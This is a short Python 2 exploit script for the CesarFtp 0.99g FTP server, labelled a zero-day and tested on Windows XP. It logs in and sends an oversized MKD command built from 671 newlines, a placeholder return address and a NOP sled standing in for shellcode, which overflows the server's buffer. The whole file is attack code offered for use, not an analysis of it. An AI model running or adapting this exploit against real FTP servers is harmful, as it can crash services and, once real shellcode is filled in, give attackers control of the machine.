#!/usr/bin/python
#CesarFtp 0.99g 0day Exploit
#Tested on Windows XP

from socket import *

host = "192.168.0.121"
port = 21
#Create username and password and enter below
user = "ftp"
password = "ftp"

EIP = "\x42\x42\x42\x42" #jmp esp 
shellcode ="\x90"*200

s = socket(AF_INET, SOCK_STREAM)
s.connect((host, port))
print s.recv(1024)

s.send("user %s\r\n" % (user))
print s.recv(1024)

s.send("pass %s\r\n" % (password))
print s.recv(1024)

buffer = "MKD "
buffer += "\n" * 671
buffer +=  EIP
buffer += "\x44" * 40 + shellcode 
buffer += "\x43" *(894 - len(buffer))
buffer += "\r\n"

print "len: %d" % (len(buffer))

s.send(buffer)
print s.recv(1024)
s.close()
